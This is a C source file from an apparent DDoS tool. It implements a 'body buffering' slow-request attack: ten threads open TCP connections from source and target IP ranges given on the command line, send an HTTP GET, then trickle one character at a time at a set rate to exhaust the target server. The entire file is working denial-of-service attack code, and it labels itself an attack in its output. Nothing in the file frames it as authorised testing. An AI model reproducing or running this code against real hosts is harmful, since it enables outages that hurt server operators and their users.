#include "header.h"
#include "base/make_ipv4.h"
#include "base/make_tcp.h"
#include "base/subnet_mask.h"
#include "base/time_check.h"
#include "ddos/body_buffering.h"

#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
#define BODY_BUFFERING_CNT 2000

// session counting
__u64 g_bodybuf_num_total;
__u64 g_bodybuf_num_generated_in_sec;
// from main()
unsigned char g_bodybuf_src_ip[16] = { 0, };
unsigned char g_bodybuf_dest_ip[16] = { 0, };
__u32 g_bodybuf_src_mask;
__u32 g_bodybuf_dest_mask;
__u32 g_bodybuf_dest_port_start;
__u32 g_bodybuf_dest_port_end;
__u32 g_bodybuf_request_per_sec;
// for masking next ip address
unsigned char g_bodybuf_now_src_ip[16];
unsigned char g_bodybuf_now_dest_ip[16];
__u32 g_bodybuf_now_dest_port;
// thread
pthread_mutex_t g_bodybuf_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_bodybuf_cond = PTHREAD_COND_INITIALIZER;
// time checking
struct timespec g_bodybuf_before_time;
struct timespec g_bodybuf_now_time;

void body_buffering_print_usage(void)
{
	printf(
			"body buffering Usage : "
			"[Src-IP/mask] [Dest-IP/mask] [Dest-Port] [#Requests-Per-Sec]\n");
	return;
}

void *generate_body_buffering(void *data)
{
	int thread_id = *((int*) data);
	// make tcp connection
	int sock = -1;
	// for data transfer
	int src_port, seq, ack;
	int body_buffering_cnt = 0;
	while (1) {
		// *** begin of critical section ***
		pthread_mutex_lock(&g_bodybuf_mutex);
		generator(
				g_bodybuf_src_ip,
				g_bodybuf_dest_ip,
				g_bodybuf_src_mask,
				g_bodybuf_dest_mask,
				g_bodybuf_dest_port_start,
				g_bodybuf_dest_port_end,
				g_bodybuf_now_src_ip,
				g_bodybuf_now_dest_ip,
				&g_bodybuf_now_dest_port);
		if (body_buffering_cnt % BODY_BUFFERING_CNT == 0) {
			sock = tcp_make_connection(
					inet_addr(g_bodybuf_now_src_ip),
					inet_addr(g_bodybuf_now_dest_ip),
					&src_port,
					g_bodybuf_now_dest_port,
					&seq,
					&ack,
					0);
			tcp_socket_send_data(
					sock,
					inet_addr(g_bodybuf_now_src_ip),
					inet_addr(g_bodybuf_now_dest_ip),
					src_port,
					g_bodybuf_now_dest_port,
					GET_METHOD,
					strlen(GET_METHOD),
					seq, ack, 0);
			seq += strlen(GET_METHOD);

			body_buffering_cnt = 0;
		}
		// wait a second
		if (g_bodybuf_num_generated_in_sec >= g_bodybuf_request_per_sec) {
			pthread_cond_wait(&g_bodybuf_cond, &g_bodybuf_mutex);
		}
		// time checking
		time_check(
				&g_bodybuf_cond,
				&g_bodybuf_before_time,
				&g_bodybuf_now_time, &g_bodybuf_num_generated_in_sec);
		// send one character
		char data[] = "a\r\n";

		tcp_socket_send_data_no_ack(
				sock,
				inet_addr(g_bodybuf_now_src_ip),
				inet_addr(g_bodybuf_now_dest_ip),
				src_port,
				g_bodybuf_now_dest_port,
				data,
				strlen(data),
				seq,
				ack,
				0);
		seq += strlen(data);

		g_bodybuf_num_generated_in_sec++;
		g_bodybuf_num_total++;
		body_buffering_cnt++;
		// *** end of critical section ***
		pthread_mutex_unlock(&g_bodybuf_mutex);
	}
	close(sock);
	return NULL;
}

void *body_buffering_time_check(void *data)
{
	while (1) {
		pthread_mutex_lock(&g_bodybuf_mutex);
		time_check(
				&g_bodybuf_cond,
				&g_bodybuf_before_time,
				&g_bodybuf_now_time,
				&g_bodybuf_num_generated_in_sec);
		pthread_mutex_unlock(&g_bodybuf_mutex);
	}
	return NULL;
}

void body_buffering_main(char *argv[])
{
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}
	if (argc != 4) {
		body_buffering_print_usage();
		return;
	}
	split_ip_mask_port(
			argv,
			g_bodybuf_src_ip,
			g_bodybuf_dest_ip,
			&g_bodybuf_src_mask,
			&g_bodybuf_dest_mask,
			&g_bodybuf_dest_port_start,
			&g_bodybuf_dest_port_end);
	g_bodybuf_num_generated_in_sec = 0;
	g_bodybuf_num_total = 0;
	memset(&g_bodybuf_before_time, 0, sizeof(struct timespec));
	memset(&g_bodybuf_now_time, 0, sizeof(struct timespec));
	g_bodybuf_request_per_sec = atoi(argv[3]);
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];
	for (int i = 0; i < num_threads; i++) {
		thread_ids[i] = i;
	}
	printf("Body Buffering attack to %s using %d threads\n",
			g_bodybuf_dest_ip,
			num_threads);
	int i;
	for (i = 0; i < num_threads; i++) {
		pthread_create(
				&threads[i],
				NULL,
				generate_body_buffering,
				(void *)&thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, body_buffering_time_check, NULL);
	for (int i = 0; i < num_threads; i++) {
		pthread_join(threads[i], NULL);
		printf("threads %d joined\n", i);
	}
	printf("Body Buffering attack finished.\n");
	pthread_mutex_destroy(&g_bodybuf_mutex);
	pthread_exit(NULL);
	printf("UDP flood finished\nTotal %lu packets sent.\n",
			g_bodybuf_num_total);
	return;
}
